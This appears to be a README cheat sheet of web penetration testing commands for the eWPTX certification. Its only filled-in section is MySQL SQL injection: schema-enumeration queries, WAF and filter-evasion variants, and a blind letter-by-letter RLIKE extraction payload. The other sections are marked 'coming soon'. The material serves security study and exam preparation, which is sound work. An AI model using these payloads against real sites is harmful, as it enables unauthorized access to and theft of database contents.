# eWPTX
List of useful commands for web penetration testing and eWPTX certification

## XSS
coming soon

## SQLi

### MSSQL
cooming soon

### Oracle
cooming soon

### MySQL

**List database name**

```
SELECT DATABASE();-- -
```

**List the table of a specific database**

```
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = '';-- -
```

**List the table of a specific database with limit and offset**

```
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = '' LIMIT 1 OFFSET N;-- -
```

**List the columns of a specific table and database**

```
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = '' AND table_name = '';-- -
```

**List the nth column of a specific table**

```
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = '' AND table_name = '' AND ORDINAL_POSITION = N;-- -
```

**Concat query elements when spaces are not allowed**

```
SELECT/**/DATABASE();-- -
```

**Concat query elements when spaces AND comments are not allowed***

```
(SELECT(group_concat(table_name))FROM(INFORMATION_SCHEMA.tables)WHERE(table_schema=database()));-- -
```

**Basic camel case filter evasion**

```
SeLEcT gROup_cOnCaT(TabLE_NamE) FroM InfOrmaTioN_SchEma.TabLeS WhERe tABle_scHEmA =lower('');-- -
```

**Basic evasion if WHERE statement is not allowed**

```
SELECT * FROM GROUP BY HAVING ID=1;-- -
```

**Filter evasion where SQL keywords are not allowed**

```
sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt tZEROFILLaZEROFILLbZEROFILLlZEROFILLe_nZEROFILLaZEROFILLmZEROFILLe fZEROFILLrZEROFILLoZEROFILLm iZEROFILLnZEROFILLfZEROFILLoZEROFILLrZEROFILLmZEROFILLaZEROFILLtZEROFILLiZEROFILLoZEROFILLn_sZEROFILLcZEROFILLhZEROFILLeZEROFILLmZEROFILLa.tZEROFILLaZEROFILLbZEROFILLlZEROFILLeZEROFILLs wZEROFILLhZEROFILLeZEROFILLrZEROFILLe tZEROFILLaZEROFILLbZEROFILLlZEROFILLe_sZEROFILLcZEROFILLhZEROFILLeZEROFILLmZEROFILLa = '';-- -
```

**Letter by letter database enumeration**

```
a' RLIKE (SELECT (
	CASE WHEN(
		ORD( /* string to ASCII conversion /*
			SUBSTRING( /* string, starting index, ending index */
			(
				SELECT IFNULL(CAST(table_name AS NCHAR),0x20)
				FROM INFORMATION_SCHEMA.TABLES
				WHERE table_schema=0x696e666f726d6174696f6e5f736368656d61 LIMIT 2,1
			)
		,11,1)
	)>64 /* check if the ASCII value of a specified letter is bigger than a specified value */
)
THEN 0x61 ELSE 0x28 END))
```

**Other tips**
* Encode query in base64
* Double-encode query in base64
* Use HEX conversion 

## XXE
coming soon
